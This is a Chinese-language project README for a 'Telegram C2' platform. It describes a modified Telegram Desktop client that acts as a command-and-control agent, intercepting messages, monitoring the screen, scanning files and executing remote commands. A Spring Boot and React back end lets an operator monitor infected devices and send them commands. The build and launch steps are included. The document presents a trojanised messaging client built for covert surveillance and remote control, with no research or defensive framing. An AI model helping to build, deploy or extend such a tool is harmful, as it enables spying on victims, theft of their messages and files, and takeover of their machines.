# Telegram C2 项目

本项目是一个集成了 Telegram 客户端修改、数据采集与远程控制 (C2) 的综合平台。项目分为两个主要开发部分：客户端 (Client) 和 Web 平台 (Platform)。

## 📂 项目结构

### 1. [Telegram C2 客户端 (Client)](tdesktop/README.md)
- **路径**: `tdesktop/`
- **说明**: 基于 Telegram Desktop 源码修改的 C2 Agent。
- **功能**: 负责消息拦截、屏幕监控、文件扫描、远程命令执行等。
- **文档**: 请参阅 [tdesktop/README.md](tdesktop/README.md) 获取构建和运行指南。

### 2. [Telegram C2 Web 平台 (Platform)](platform/README.md)
- **路径**: `platform/`
- **说明**: 包含后端服务和前端管理界面。
- **组成**:
  - **后端**: Spring Boot 应用，处理心跳、数据存储和 API 请求。
  - **前端**: React 管理后台，用于设备监控和指令下发。
- **文档**: 请参阅 [platform/README.md](platform/README.md) 获取部署和启动指南。

---

## 🚀 快速开始

### 启动 Web 平台
1. **启动后端**: 运行 `platform/backend` 下的 Spring Boot 应用 (端口 8101)。
2. **启动前端**: 运行 `platform/frontend` 下的 React 应用 (端口 8000)。
3. **访问后台**: 打开浏览器访问 `http://localhost:8000`。

### 启动客户端
1. **编译**: 参考客户端文档编译 `Telegram.exe`。
2. **运行**: `Telegram.exe -workdir tdata`。
3. **连接**: 客户端将自动连接本地后端 (`http://localhost:8101`) 并上线。

## 📅 开发日志与路线图

详细的历史开发记录（Phase 1 - Phase 6）请参考之前的文档或各子项目的提交记录。当前重点处于 **Web 端与 TG 端的独立开发与联调阶段**。
